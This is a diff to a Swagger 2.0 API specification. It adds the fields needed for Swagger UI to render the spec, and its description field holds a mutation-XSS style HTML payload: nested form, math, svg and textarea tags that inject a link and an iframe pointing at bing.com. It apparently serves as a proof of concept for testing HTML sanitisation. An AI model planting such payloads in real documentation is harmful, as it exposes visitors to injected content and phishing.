@@ -1,5 +1,28 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
+  version: "1.0.0"
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>></form><a href=https://bing.com>clickme</a><iframe src=https://bing.com>
+host: api.example.com
+basePath: /v1
+schemes:
+  - https
+consumes:
+  - application/json
+produces:
+  - application/json
+paths:
+  /test-endpoint:
+    get:
+      summary: A test endpoint to display the documentation
+      description: This endpoint exists to validly render the Swagger UI.
+      responses:
+        200:
+          description: OK
+          schema:
+            type: object
+            properties:
+              status:
+                type: string
+                example: "success"
